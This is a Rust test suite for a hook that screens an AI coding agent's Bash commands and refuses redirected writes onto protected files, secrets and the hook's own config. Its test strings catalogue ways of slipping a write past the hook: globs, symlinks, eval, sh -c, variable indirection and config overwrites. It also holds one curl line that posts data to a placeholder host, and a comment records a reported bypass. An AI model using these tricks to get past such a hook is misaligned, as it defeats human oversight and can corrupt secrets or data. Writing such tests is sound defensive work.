//! bd-qe9: a Bash redirection writes its target whatever the command does with
//! its words. `echo` reads nothing, and `echo x >>secret` still changes the
//! secret. veil refuses to redirect onto a file it would not let the command
//! read, and to create one among its own built-in protected paths. Every case
//! drives the real binary with a `PreToolUse` payload. One test also runs what
//! the hook allows in a real shell, to see what becomes of the file.
//!
//! bd-bow: a target veil cannot resolve (`>"$OUT"`) is refused under
//! `dynamic_args`, whatever the command is.

use std::fs;
use std::io::Write as _;
use std::os::unix::fs::{PermissionsExt, symlink};
use std::path::PathBuf;
use std::process::{Command, Stdio};
use std::sync::atomic::{AtomicU64, Ordering};
use std::time::{SystemTime, UNIX_EPOCH};

use serde_json::{Value, json};

mod common;
#[path = "common/user.rs"]
mod user;

const REPORT: &str = "{\"tool\":\"shape\",\"outcome\":\"COMPATIBLE\",\"rows\":3}\n";
const LEDGER: &str = "loan_id,balance\n1,100\n2,200\n";

static COUNTER: AtomicU64 = AtomicU64::new(0);

struct Fixture {
    root: PathBuf,
}

#[derive(Debug)]
struct Verdict {
    action: String,
    reason: String,
}

impl Fixture {
    fn new() -> Self {
        let time = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .expect("clock is after epoch")
            .as_nanos();
        let root = std::env::temp_dir().join(format!(
            "veil-redirect-{}-{time}-{}",
            std::process::id(),
            COUNTER.fetch_add(1, Ordering::Relaxed)
        ));
        for directory in [
            "home/.cmdrvl/secrets",
            "bin",
            "project/data",
            "project/scripts",
        ] {
            fs::create_dir_all(root.join(directory)).expect("fixture directory");
        }
        let fixture = Self {
            root: fs::canonicalize(root).expect("canonical fixture root"),
        };
        fixture.configure("deny");
        fixture.write("data/ledger.csv", LEDGER);
        fixture.write("notes.md", "notes\n");
        fixture.write("scripts/append.sh", "echo x >>data/ledger.csv\n");
        fixture.write("scripts/to-variable.sh", "echo x >\"$OUT\"\n");
        fs::write(fixture.home().join(".cmdrvl/secrets/k"), "placeholder\n").expect("secret");

        let shape = fixture.root.join("bin/shape");
        fs::write(&shape, format!("#!/bin/sh\nprintf '%s' '{REPORT}'\n")).expect("fake tool");
        fs::set_permissions(&shape, fs::Permissions::from_mode(0o700)).expect("executable");

        // names that lead to a protected file, or to where one would be made,
        // and that already exist when the hook looks
        symlink("data/ledger.csv", fixture.path("ledger-link")).expect("file link");
        symlink(
            fixture.home().join(".cmdrvl/secrets"),
            fixture.path("secrets-dir"),
        )
        .expect("directory link");
        symlink(
            fixture.home().join(".cmdrvl/config/veil/config.toml"),
            fixture.path("settings-later"),
        )
        .expect("dangling link");
        fixture
    }

    fn project(&self) -> PathBuf {
        self.root.join("project")
    }

    fn home(&self) -> PathBuf {
        self.root.join("home")
    }

    fn path(&self, relative: &str) -> PathBuf {
        self.project().join(relative)
    }

    fn write(&self, relative: &str, content: &str) {
        fs::write(self.path(relative), content).expect("fixture file");
    }

    fn configure(&self, policy: &str) {
        self.write(".veil.toml", "[sensitivity]\nprotected = [\"data/**\"]\n");
        // `deny` is the default, and the tests of new files under veil's own
        // paths need the user's config not to be there yet
        if policy != "deny" {
            self.settings(&format!("default = \"{policy}\""));
        }
    }

    /// `[policy]` lines in the user's settings: a project cannot loosen.
    fn settings(&self, policy_lines: &str) {
        user::write_config(&self.home(), &format!("[policy]\n{policy_lines}\n"));
    }

    fn veil(&self) -> Command {
        self.in_session(Command::new(env!("CARGO_BIN_EXE_veil")))
    }

    /// `command` with the environment and directory the hook and the shell that
    /// runs what it allows both have: `OUT` and `D` are exported to both, and
    /// name a protected file and its directory.
    fn in_session(&self, mut command: Command) -> Command {
        command
            .env_clear()
            .env("HOME", self.home())
            .env(
                "PATH",
                format!("{}:/usr/bin:/bin", self.root.join("bin").display()),
            )
            .env("OUT", "data/ledger.csv")
            .env("D", "data")
            .current_dir(self.project());
        command
    }

    /// Saves what `veil exec shape` prints in session `s1`, as `> to` would.
    fn registered_report(&self, to: &str) {
        self.write(to, "");
        let output = self
            .veil()
            .env("CLAUDE_CODE_SESSION_ID", "s1")
            .args(["exec", "shape", "data/ledger.csv"])
            .output()
            .expect("veil exec");
        assert!(
            output.status.success(),
            "{}",
            String::from_utf8_lossy(&output.stderr)
        );
        fs::write(self.path(to), output.stdout).expect("report");
    }

    fn hook(&self, session: &str, tool: &str, tool_input: Value) -> Verdict {
        let payload = json!({
            "hook_event_name": "PreToolUse",
            "session_id": session,
            "cwd": self.project(),
            "tool_name": tool,
            "tool_input": tool_input,
        });
        let mut child = self
            .veil()
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .expect("veil hook");
        child
            .stdin
            .take()
            .expect("stdin")
            .write_all(payload.to_string().as_bytes())
            .expect("payload");
        let output = child.wait_with_output().expect("hook exit");
        let denial = common::claude_denial(&output);
        Verdict {
            action: if denial.is_some() { "deny" } else { "allow" }.to_owned(),
            reason: denial.unwrap_or_default(),
        }
    }

    fn bash(&self, command: &str) -> Verdict {
        self.hook("s1", "Bash", json!({"command": command}))
    }

    /// Refused by the dynamic-argument stance, and nothing else gave the
    /// reason.
    fn assert_refused_by_the_stance(&self, command: &str) {
        let verdict = self.bash(command);
        assert!(
            verdict.action == "deny" && verdict.reason.contains("cannot resolve to a path"),
            "{command}: {verdict:?}"
        );
    }

    fn audit(&self) -> Vec<Value> {
        fs::read_to_string(self.home().join(".cmdrvl/logs/veil/audit.jsonl"))
            .unwrap_or_default()
            .lines()
            .map(|line| serde_json::from_str(line).expect("audit JSON"))
            .collect()
    }

    /// The commands for which the hook did not both deny the call and record
    /// that a redirection's target is what it could not resolve. A command that
    /// is denied for some other word shows nothing about its redirect.
    fn target_not_refused(&self, commands: &[String]) -> Vec<String> {
        commands
            .iter()
            .filter_map(|command| {
                let before = self.audit().len();
                let verdict = self.bash(command);
                let judged = self.audit().into_iter().skip(before).any(|record| {
                    record["reason_class"] == "dynamic_path_unresolvable"
                        && record["reason"]
                            .as_str()
                            .is_some_and(|reason| reason.contains("redirects output to"))
                });
                (verdict.action != "deny" || !judged)
                    .then(|| format!("{command:?} -> {} {}", verdict.action, verdict.reason))
            })
            .collect()
    }

    /// The commands that were not refused as a redirected write, each with
    /// what happened instead. All of them are tried, so one run lists them all.
    fn not_refused(&self, commands: &[String]) -> Vec<String> {
        commands
            .iter()
            .filter_map(|command| {
                let verdict = self.bash(command);
                let refused =
                    verdict.action == "deny" && verdict.reason.contains("redirects output");
                (!refused).then(|| format!("{command:?} -> {} {}", verdict.action, verdict.reason))
            })
            .collect()
    }

    fn not_allowed(&self, commands: &[String]) -> Vec<String> {
        commands
            .iter()
            .filter_map(|command| {
                let verdict = self.bash(command);
                (verdict.action != "allow")
                    .then(|| format!("{command:?} -> {} {}", verdict.action, verdict.reason))
            })
            .collect()
    }
}

fn owned(commands: &[&str]) -> Vec<String> {
    commands
        .iter()
        .map(|command| (*command).to_owned())
        .collect()
}

fn assert_none(failures: &[String], what: &str) {
    assert!(
        failures.is_empty(),
        "{} {what}:\n{}",
        failures.len(),
        failures.join("\n")
    );
}

#[test]
fn every_form_of_redirection_onto_a_protected_file_is_refused() {
    let fixture = Fixture::new();
    let commands = owned(&[
        // the operators, spaced and attached
        "echo x >> data/ledger.csv",
        "echo x >>data/ledger.csv",
        "echo x > data/ledger.csv",
        "echo x >data/ledger.csv",
        "echo x>>data/ledger.csv",
        "echo x >| data/ledger.csv",
        "echo x 2>>data/ledger.csv",
        "echo x 1> data/ledger.csv",
        "echo x &>>data/ledger.csv",
        "echo x &> data/ledger.csv",
        "echo x >&data/ledger.csv",
        "echo x <>data/ledger.csv",
        // zsh's forms of overwrite and append
        "echo x >! data/ledger.csv",
        "echo x >>!data/ledger.csv",
        // quoting the target changes nothing
        "echo x >>\"data/ledger.csv\"",
        "echo x > 'data/ledger.csv'",
        // with no command, or one that reads something else
        "> data/ledger.csv",
        ">>data/ledger.csv",
        ": >data/ledger.csv",
        "cat notes.md >>data/ledger.csv",
        "python3 scripts/gen.py >>data/ledger.csv",
        "cat >>data/ledger.csv <<'EOF'\n3,300\nEOF",
        "echo x | cat >>data/ledger.csv",
        "exec >>data/ledger.csv",
        // compound commands and the places a command can hide
        "{ echo a; echo b; } >>data/ledger.csv",
        "( echo a ) >>data/ledger.csv",
        "for f in a b; do echo $f; done >>data/ledger.csv",
        "if true; then echo a; fi >data/ledger.csv",
        "echo $(echo x >>data/ledger.csv)",
        "sh -c 'echo x >>data/ledger.csv'",
        "bash scripts/append.sh",
        // other ways to say the same file
        "cd data && echo x >>ledger.csv",
        "f=data/ledger.csv; echo x >>$f",
        "echo x >>./data/../data/ledger.csv",
        "echo x >>data/ledg*.csv",
        "echo x >> da?a/ledger.csv",
        "echo x >>dat[a]/ledger.csv",
        "echo x >>{data,scripts}/ledger.csv",
        "echo x >>ledger-link",
        // a wrapper that puts what it runs in place of the line's own words
        "timeout 5 date >>data/ledger.csv",
        "sh -c 'date' >>data/ledger.csv",
        "eval 'date' >>data/ledger.csv",
        "find notes.md -exec date \\; >>data/ledger.csv",
        "npx -c 'date' >>data/ledger.csv",
        "env -S 'date -u' >>data/ledger.csv",
        ">>data/ledger.csv date",
        "declare -i n=1 >>data/ledger.csv",
        // a spine tool is authorized to read it, not to write over it
        "shape data/ledger.csv >>data/ledger.csv",
        "veil exec shape data/ledger.csv > data/ledger.csv",
    ]);
    assert_none(&fixture.not_refused(&commands), "writes were not refused");

    let verdict = fixture.bash("echo x >>data/ledger.csv");
    assert_eq!(verdict.action, "deny", "{verdict:?}");
    let record = fixture.audit().pop().expect("an audit record");
    assert_eq!(record["decision"], "deny", "{record}");
    assert_eq!(record["reason_class"], "redirect_write", "{record}");
}

#[test]
fn the_built_in_protected_paths_take_no_redirected_output_not_even_a_new_file() {
    let fixture = Fixture::new();
    let home = fixture.home().display().to_string();
    let commands = owned(&[
        // the report on the bead
        "echo x >>~/.cmdrvl/secrets/k",
        "echo x >> ~/.cmdrvl/secrets/k",
        "echo x >$HOME/.cmdrvl/secrets/k",
        // a file that is not there yet: veil's settings can turn denials off
        "echo x >~/.cmdrvl/config/veil/config.toml",
        "echo x >> ~/.cmdrvl/secrets/new",
        &format!("echo x >{home}/.cmdrvl/config/new.toml"),
        "echo x >secrets-dir/new",
        "echo x >settings-later",
    ]);
    assert_none(&fixture.not_refused(&commands), "writes were not refused");
}

#[test]
fn other_redirections_are_left_alone() {
    let fixture = Fixture::new();
    let commands = owned(&[
        "echo x >>notes.md",
        "echo x > fresh.txt",
        // a new file in a protected directory changes nothing protected: this
        // is how a report gets there
        "veil exec shape data/ledger.csv > data/shape.json",
        "shape data/ledger.csv >data/other-shape.json",
        "echo x >data/new-note.txt",
        // descriptors and devices
        "echo x 2>/dev/null",
        "echo x >/dev/null 2>&1",
        "echo x >&2",
        "echo x 1>&2",
        "echo x >& 2",
        "echo x 2>&-",
        "echo x >/dev/stderr",
        "echo x &>/dev/null",
        // not redirections at all
        "grep -c '>>' notes.md",
        "echo '>> data/ledger.csv'",
        "echo \"a > b\"",
        // outside veil's own subtrees
        "echo x >~/.cmdrvl/elsewhere.txt",
    ]);
    assert_none(&fixture.not_allowed(&commands), "commands were refused");
}

/// Each file costs the hook a look at the disk, and a hook that runs out of
/// time stops nothing, so the number it follows is bounded and the rest is
/// refused, not waved through.
#[test]
fn more_redirected_files_than_veil_follows_are_refused_not_skipped() {
    let fixture = Fixture::new();
    let many: String = (0..300).map(|number| format!(" >out{number}")).collect();
    let commands = vec![
        format!("echo x{many}"),
        format!("echo x{many} >>data/ledger.csv"),
    ];
    assert_none(&fixture.not_refused(&commands), "writes were not refused");

    // one file named over and over is one file
    let again = vec![format!("echo x{}", " >>notes.md".repeat(300))];
    assert_none(&fixture.not_allowed(&again), "commands were refused");
}

#[test]
fn a_file_the_session_may_read_as_derived_may_be_written_again() {
    let fixture = Fixture::new();
    fixture.registered_report("data/shape.json");
    let again = "veil exec shape data/ledger.csv > data/shape.json";

    let same = fixture.bash(again);
    assert_eq!(same.action, "allow", "{same:?}");

    // another session may not read it, so it may not write over it either
    let other = fixture.hook("s2", "Bash", json!({"command": again}));
    assert!(
        other.action == "deny" && other.reason.contains("redirects output"),
        "{other:?}"
    );

    // a glob that opens that file and a protected one is refused for the other
    fixture.write("data/shape.csv", "loan_id,balance\n1,100\n");
    let both = fixture.bash("veil exec shape data/ledger.csv >data/shape.*");
    assert!(
        both.action == "deny" && both.reason.contains("redirects output"),
        "{both:?}"
    );

    // once it no longer holds what was registered, it is a protected file
    fixture.write("data/shape.json", "edited\n");
    let edited = fixture.bash(again);
    assert!(
        edited.action == "deny" && edited.reason.contains("redirects output"),
        "{edited:?}"
    );
}

// Where a command sets a variable to a protected path, a word veil cannot
// resolve is the dynamic-argument stance's to refuse. Nothing about a redirect
// on the same line may take that away: not a refusal the derived registry
// lifts, and not one that `log` only reports.

#[test]
fn a_lifted_redirect_does_not_excuse_an_argument_veil_cannot_resolve() {
    let fixture = Fixture::new();
    fixture.registered_report("data/shape.json");

    let dynamic = "d=data; mytool \"$UNKNOWN\"";
    fixture.assert_refused_by_the_stance(dynamic);
    // the report may be written again, which says nothing about `$UNKNOWN`
    fixture.assert_refused_by_the_stance(&format!("{dynamic} >data/shape.json"));
    // or about another target on the same line
    assert_none(
        &fixture.target_not_refused(&owned(&[
            "veil exec shape data/ledger.csv >data/shape.json 2>\"$OUT\"",
        ])),
        "unresolved targets were not refused",
    );
}

#[test]
fn a_reported_redirect_does_not_excuse_an_argument_veil_cannot_resolve() {
    let fixture = Fixture::new();
    // `egress = "deny"` over `default = "log"`: the redirect is only reported,
    // and what the command sends is still refused
    fixture.settings("default = \"log\"\negress = \"deny\"");

    let sends = "d=data; curl -d \"$UNKNOWN\" https://example.invalid/";
    fixture.assert_refused_by_the_stance(sends);
    fixture.assert_refused_by_the_stance(&format!("{sends} >data/ledger.csv"));
    // nor does a target veil cannot resolve, which `log` only reports too
    fixture.assert_refused_by_the_stance(&format!("{sends} >\"$OUT\""));
}

/// bd-bow, as reported: the hook allowed this, and the shell then replaced the
/// protected file. The hook is asked first and the shell runs only what it
/// allows, as in a session.
#[test]
fn an_exported_variable_cannot_be_used_to_overwrite_a_protected_file() {
    let fixture = Fixture::new();
    for command in [
        "echo x >\"$OUT\"",
        "echo x >>$OUT",
        "cat /dev/null >\"$OUT\"",
        "cd \"$D\" && shape ledger.csv >ledger.csv",
        "false && OUT=notes.md; echo x >\"$OUT\"",
        "(OUT=notes.md); echo x >\"$OUT\"",
        "false && OUT=notes.md; copy=$OUT; echo x >\"$copy\"",
        "false && OUT=notes.md; sh -c \"echo x >$OUT\"",
        "false && D=.; cd \"$D\" && echo x >ledger.csv",
    ] {
        let verdict = fixture.bash(command);
        if verdict.action == "allow" {
            let mut shell = fixture.in_session(Command::new("/bin/bash"));
            shell.args(["--noprofile", "--norc", "-c", command]);
            shell.status().expect("bash");
        }
        let held = fs::read_to_string(fixture.path("data/ledger.csv")).expect("ledger");
        assert_eq!(held, LEDGER, "{command} changed the file: {verdict:?}");
    }
}

#[test]
fn a_target_veil_cannot_resolve_is_refused_whatever_the_command() {
    let fixture = Fixture::new();
    let commands = owned(&[
        // the operators
        "echo x >\"$OUT\"",
        "echo x >>$OUT",
        "echo x > \"${OUT}\"",
        "echo x >|\"$OUT\"",
        "echo x &>\"$OUT\"",
        "echo x 2>\"$OUT\"",
        "echo x <>\"$OUT\"",
        "echo x >&\"$OUT\"",
        // other things only the shell can fill in
        "echo x >\"${OUT:-notes.md}\"",
        "echo x >\"$(printf %s data/ledger.csv)\"",
        "echo x >`echo data/ledger.csv`",
        "echo x >data/ledger.cs$(printf v)",
        "echo x >~nobody/notes.txt",
        "set -- $OUT; echo x >\"$1\"",
        // zsh's own expansions
        "echo x >$=OUT",
        "echo x >\"$=OUT\"",
        "echo x >$~OUT",
        "echo x >$^OUT",
        "echo x >${=OUT}",
        // with no command, and around compound ones
        "cat /dev/null >\"$OUT\"",
        ">\"$OUT\"",
        "exec >\"$OUT\"; echo x",
        "{ echo x; } >\"$OUT\"",
        "if true; then echo x; fi >\"$OUT\"",
        // inside what a command hands to a shell, and around a wrapper
        "eval 'echo x >\"$OUT\"'",
        "bash -c 'echo x >\"$OUT\"'",
        "sh <<'EOF'\necho x >\"$OUT\"\nEOF",
        "timeout 5 date >\"$OUT\"",
        "find notes.md -exec date \\; >\"$OUT\"",
        // a spine tool is not asked to resolve its arguments; its redirect is
        // the shell's, not the tool's
        "shape data/ledger.csv >\"$OUT\"",
        "veil exec shape data/ledger.csv >\"$OUT\"",
        // the same name in a directory veil cannot follow is another file
        "cd \"$D\" && shape ledger.csv >ledger.csv",
        "cd \"$D\" && veil exec shape ledger.csv >ledger.csv",
        // a finding for another redirect on the line does not stand in for it
        "echo x >data/ledger.csv 2>\"$OUT\"",
    ]);
    assert_none(
        &fixture.target_not_refused(&commands),
        "unresolved targets were not refused",
    );
}

/// veil reads an assignment whether or not the shell will run it. Where it does
/// not, a variable the shell started with keeps what it held.
#[test]
fn an_assignment_the_shell_may_skip_does_not_settle_an_inherited_target() {
    let fixture = Fixture::new();
    let commands = owned(&[
        "false && OUT=notes.md; echo x >\"$OUT\"",
        "true || OUT=notes.md; echo x >\"$OUT\"",
        "false && { true; OUT=notes.md; }; echo x >\"$OUT\"",
        "if false; then true; OUT=notes.md; fi; echo x >\"$OUT\"",
        "(OUT=notes.md); echo x >\"$OUT\"",
        "(true; OUT=notes.md); echo x >\"${OUT}\"",
        "OUT=notes.md | cat; echo x >\"$OUT\"",
        "unused() { true; OUT=notes.md; }; echo x >\"$OUT\"",
        "local OUT=notes.md; echo x >\"$OUT\"",
        // an empty value leaves veil no word at all
        "false && OUT=; echo x >$OUT",
        // a copy of the name is no better than the name
        "false && OUT=notes.md; copy=$OUT; echo x >\"$copy\"",
        "false && OUT=notes.md; a=$OUT; b=${a}; echo x >$b",
        "false && OUT=notes.md; for f in \"$OUT\"; do echo x >\"$f\"; done",
        "false && for OUT in notes.md; do :; done; echo x >\"$OUT\"",
        "false && OUT=notes.md; copy=$OUT sh -c 'echo x >\"$copy\"'",
        // the value written into a script, where no `$` is left to show it
        "false && OUT=notes.md; sh -c \"echo x >$OUT\"",
        "false && OUT=notes.md; eval \"echo x >$OUT\"",
        "false && OUT=notes.md; sh <<EOF\necho x >$OUT\nEOF",
        // or into the directory the target is named from
        "false && D=.; cd \"$D\" && echo x >ledger.csv",
    ]);
    assert_none(
        &fixture.target_not_refused(&commands),
        "unresolved targets were not refused",
    );

    // the value veil read is still judged: this one names the file outright
    let spelled = "D=data/ledger.csv; echo x >\"$D\"";
    assert_none(
        &fixture.not_refused(&owned(&[spelled])),
        "writes were not refused",
    );
}

#[test]
fn targets_veil_can_resolve_are_not_called_unresolved() {
    let fixture = Fixture::new();
    let commands = owned(&[
        "echo x >out.txt",
        "echo x >\"$HOME/notes.txt\"",
        "echo x >~/notes.txt",
        "echo x >\"$PWD/out.txt\"",
        "f=out.txt; echo x >\"$f\"",
        "for i in a b; do echo x >$i.txt; done",
        // the shell's own numbers are never a way to another file
        "echo x >/tmp/veil-redirect.$$",
        // the argument is unresolved, the target is not
        "echo \"$MESSAGE\" >out.txt",
        // a pipe to another command, and copies of descriptors
        "echo x > >(cat)",
        "echo x 2>&1",
        "echo x >&2",
        // a script file's unresolved words are not judged, its targets included
        "bash scripts/to-variable.sh",
        // no redirection at all
        "echo '>\"$OUT\"'",
    ]);
    assert_none(&fixture.not_allowed(&commands), "commands were refused");
}

#[test]
fn the_dynamic_stance_and_the_policy_mode_apply_to_an_unresolved_target() {
    let command = "echo x >\"$OUT\"";
    for (settings, begins) in [
        ("default = \"log\"", "policy default log:"),
        ("dynamic_args = \"warn\"", "[policy] dynamic_args = warn:"),
    ] {
        let fixture = Fixture::new();
        fixture.settings(settings);

        let verdict = fixture.bash(command);

        assert_eq!(verdict.action, "allow", "{settings}: {verdict:?}");
        let record = fixture.audit().pop().expect("an audit record");
        assert_eq!(record["reason_class"], "dynamic_path_unresolvable");
        assert!(
            record["reason"].as_str().is_some_and(
                |reason| reason.starts_with(begins) && reason.contains("redirects output to")
            ),
            "{settings}: {record}"
        );
    }

    let fixture = Fixture::new();
    fixture.settings("dynamic_args = \"allow\"");
    let verdict = fixture.bash(command);
    assert_eq!(verdict.action, "allow", "{verdict:?}");
    assert!(fixture.audit().is_empty(), "{:?}", fixture.audit());
}

#[test]
fn the_policy_mode_applies_to_a_redirected_write() {
    let fixture = Fixture::new();
    fixture.configure("log");

    let verdict = fixture.bash("echo x >>data/ledger.csv");

    assert_eq!(verdict.action, "allow", "{verdict:?}");
    let record = fixture.audit().pop().expect("an audit record");
    assert_eq!(record["reason_class"], "redirect_write", "{record}");
    assert!(
        record["reason"]
            .as_str()
            .is_some_and(|reason| reason.starts_with("policy default log:")),
        "{record}"
    );
}
